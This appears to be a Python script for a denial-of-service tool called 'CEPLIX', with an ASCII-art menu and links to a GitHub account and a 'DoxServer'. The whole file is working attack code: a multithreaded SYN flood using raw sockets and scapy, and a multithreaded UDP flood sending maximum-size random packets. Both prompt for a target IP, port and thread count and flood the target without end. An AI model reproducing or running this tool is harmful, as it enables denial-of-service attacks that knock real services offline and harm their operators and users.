import os
import sys
import socket
import random
import threading
import time
from scapy.all import IP, TCP

ceplix = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{ceplix}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝{clear}
               
╔═════════════════════════════════════════════════════╗
║ {ceplix}*{clear} Github    {ceplix}:{clear}   https://github.com/ceplix-53        ║
║ {ceplix}*{clear} DoxServer {ceplix}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {ceplix}*{clear} version   {ceplix}:{clear}   4.0                                 ║
║ {ceplix}*{clear} CEPLIX    {ceplix}:{clear}   {ceplix}[{clear}{white}LAYER4{clear}{ceplix}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {ceplix}[{clear}1{ceplix}]{clear} SYN Flood Attack                                ║
║ {ceplix}[{clear}2{ceplix}]{clear} UDP Flood Attack                                ║                       
║ {ceplix}[{clear}3{ceplix}]{clear} Exit CEPLIX                                       ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer4():
    while True:
        logo()
        select = input(f"""
╔═══[{ceplix}root{clear}@{ceplix}CEPLIX{clear}]
╚══{ceplix}>{clear} """)
                                        
        if select == "1" or select.lower() == "s":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                    while True:
                        sport = random.randint(1024, 65535)
                        seq = random.randint(0, 4294967295)

                        ip_header = IP(dst=target)
                        tcp_header = TCP(sport=sport, dport=port, flags='S', seq=seq)

                        packet = bytes(ip_header / tcp_header)
                        print(f"[{ceplix}CEPLIX{clear}] IP Address {ceplix}:{clear} {target} {ceplix}|{clear} SYN Packet {white}:{clear} {ceplix}{ip_header / tcp_header}{clear}")
                        s.sendto(packet, (target, port)) 

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Download {ceplix}>{clear} https://npcap.com/#download")
                    time.sleep(3)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)
                    
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{ceplix}ZOIC{clear}] IP       {ceplix}>{clear} ")
            port = int(input(f"[{ceplix}ZOIC{clear}] PORT       {ceplix}>{clear} "))
            threads = int(input(f"[{ceplix}ZOIC{clear}] THREAD       {ceplix}>{clear} "))
            start_threads(target, port, threads)


        elif select == "2" or select.lower() == "u":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    while True:
                        sport = random.randint(1024, 65535)  
                        data = random.randbytes(65507)  

                        s.sendto(data, (target, port))

                        print(f"[{ceplix}CEPLIX{clear}] IP Address {ceplix}:{clear} {target} {ceplix}|{clear} UDP Packet {ceplix}:{clear} {white}65507{clear}")

                except Exception as e:
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(3)
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{ceplix}CEPLIX{clear}] IP       {ceplix}>{clear} ")
            port = int(input(f"[{ceplix}CEPLIX{clear}] PORT       {ceplix}>{clear} "))
            threads = int(input(f"[{ceplix}CEPLIX{clear}] THREAD       {ceplix}>{clear} "))
            start_threads(target, port, threads)

        elif select == "3" or select.lower() == "e":
            sys.exit()


if __name__ == "__main__":
    layer4()

